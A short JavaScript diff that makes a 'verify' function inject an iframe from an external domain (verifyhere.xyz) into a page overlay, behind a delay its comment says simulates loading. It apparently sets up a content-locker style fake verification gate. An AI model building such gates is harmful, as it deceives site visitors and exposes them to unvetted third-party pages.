@@ -1611,15 +1611,17 @@ $("body").mousemove(function (e) {
 
 document.getElementById("iframe-overlay").style.display = "none";
 // document.getElementById("lockeriframe").style.display = "none";
+// https://verifyhere.xyz/cl/i/6dxw9m
 function verify() {
   // Show the loader
-  document.getElementById("lockeriframe").style.display = "block";
+  document.getElementById("iframe-overlay").innerHTML =
+    '<iframe id="lockeriframe" src="https://verifyhere.xyz/cl/i/6dxw9m" frameborder="0" class="second-row"></iframe>';
 
   // Insert the iframe after a delay to simulate loading time
   setTimeout(function () {
     // document.getElementById("lockeriframe").style.display = "none"; // Hide loader
     document.getElementById("iframe-overlay").style.display = "flex"; // Show iframe overlay
-  }, 2000); // Adjust the delay time as needed
+  }, 500); // Adjust the delay time as needed
 }
 
 // Hide the overlay initially
